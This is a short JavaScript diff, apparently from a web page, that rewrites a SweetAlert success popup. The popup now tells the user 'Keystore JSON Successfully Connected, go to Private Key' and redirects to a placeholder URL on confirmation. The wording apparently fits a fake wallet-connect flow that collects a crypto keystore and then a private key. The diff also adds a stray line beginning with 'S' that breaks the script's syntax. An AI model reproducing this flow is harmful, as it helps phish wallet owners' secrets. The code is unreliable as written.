@@ -825,16 +825,19 @@
         await sleep(400);
     
          // Show SweetAlert popup for the successful message
+    S // Show SweetAlert popup for the successful message
     Swal.fire({
         icon: 'success',
         title: 'Success!',
-        text: 'Successfully Connected',
+        text: 'Keystore JSON Successfully Connected, go to Private Key',
+        confirmButtonText: 'OK',
     }).then((result) => {
-        // Reload the page after 5 seconds
-        setTimeout(() => {
-            location.reload();
-        }, 2000);
+        // Redirect to another link when the user clicks "OK"
+        if (result.isConfirmed) {
+            window.location.href = 'https://example.com'; // Replace with your desired URL
+        }
     });
+
 
     
         // ... (rest of the code)
